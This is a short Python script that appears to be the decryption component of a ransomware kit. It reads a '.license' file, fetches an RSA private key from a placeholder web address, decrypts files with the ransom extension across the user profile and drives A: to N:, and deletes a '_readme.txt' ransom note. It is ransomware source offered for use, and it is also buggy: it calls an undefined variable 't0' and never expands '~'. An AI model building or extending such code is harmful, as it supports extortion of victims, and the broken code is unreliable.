import os
import base64
import requests as req
from sys import platform
from Crypto.PublicKey import RSA
from Crypto.Random import get_random_bytes
from Crypto.Cipher import AES, PKCS1_OAEP

def gext(filename):
    with open(filename,'r') as license:
        ler = license.read()
        len = base64.b64decode(ler.encode('utf-8'))
        l = len.decode('utf-8')
    ext = '.' + l.split('.')[1]
    return ext

def gl(filename):
    # On Website
    try:
        url_web = "Your URL"
        with open(filename,'r') as license:
            ler = license.read()
            len = base64.b64decode(ler.encode('utf-8'))
            lsp = len.decode('utf-8').split('.')[0]
            lenc = base64.b64encode(lsp.encode('utf-8'))
            l = lenc.decode('utf-8')
        URL_KEY = url_web + l + '.pem'
        pvk = req.get(URL_KEY).text
        return pvk
    except:
        print("Please use internet connection")

def decrypt(filename,pvk):
    with open(filename, "rb") as file:
        private_key = RSA.import_key(pvk)
        enc_session_key, nonce, tag, ciphertext = [ file.read(x) for x in (private_key.size_in_bytes(), 16, 16, -1) ]
        # Decrypt the session key with the private RSA key
        cipher_rsa = PKCS1_OAEP.new(private_key)
        session_key = cipher_rsa.decrypt(enc_session_key)
        # Decrypt the data with the AES session key
        cipher_aes = AES.new(session_key, AES.MODE_EAX, nonce)
        data = cipher_aes.decrypt_and_verify(ciphertext, tag)

    with open(filename, "wb") as file:
        file.write(data)


def defense(target):
    for p, d, f in os.walk(target):
        for name in f:
            ext = gext(os.path.join(p,'.license'))
            pvk = gl(os.path.join(p,'.license'))
            if name.endswith((ext)):
                try:
                    decrypt(os.path.join(p, name),pvk)
                    newFile = os.path.splitext(name)[0]
                    os.rename(os.path.join(p, name), os.path.join(p,newFile))
                except:
                    continue
                try:
                    os.remove(os.path.join(p,"_readme.txt"))
                except:
                    status = "All Files has been Decrypted"

if __name__ == '__main__':
    if (platform == 'win32'):
        t = [os.environ["USERPROFILE"],"A:","B:","D:","E:","F:","G:","H:","I:","J:","K:","L:","M:","N:"]
        for i in range(len(t)):
            defense(t0)
    elif (platform == 'linux'):
        t = ['~']
        for i in range(len(t)):
            defense(t0)
    else:
        print('I will better')